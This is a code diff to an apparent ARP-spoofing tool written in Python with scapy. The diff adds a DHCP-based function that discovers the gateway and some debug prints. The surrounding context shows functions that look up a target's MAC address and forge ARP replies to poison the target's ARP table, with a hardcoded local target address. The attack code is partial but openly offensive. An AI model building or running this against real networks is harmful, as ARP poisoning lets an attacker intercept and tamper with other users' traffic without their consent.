@@ -3,6 +3,7 @@
 import sys, getopt
 from scapy.all import Ether , ARP,conf, get_if_addr,srp1,sendp
 from time import sleep
+from dhcpclient import DHCPClient
 BROADCASTMAC = "ff:ff:ff:ff:ff:ff"
 options = {
         "interface" :conf.iface,
@@ -16,6 +17,15 @@ def getTargetMac(target : str)->str :
     arpAttack = ARP(pdst = target  , op = "who-has" )
     reply = srp1(etherAttack/arpAttack , iface = options["interface"],verbose=False)
     return reply[Ether].src
+
+
+def getGetWayIp(): 
+    suc = None
+    while not suc : 
+        client = DHCPClient(iface = options["interface"])
+        client.discover().join()
+        suc = client.ackOptions
+    return suc
 
 def changeArpTable( target : str , src :str )->None:
     etherAttack = Ether(dst =getTargetMac(target))
@@ -70,6 +80,8 @@ def main(argv :list )->None:
     print(options.items())
 
     print(getTargetMac("10.100.102.1"))
+    print("cool")
+    print(getGetWayIp())
 
 if __name__ == "__main__":
     main(sys.argv[1:])
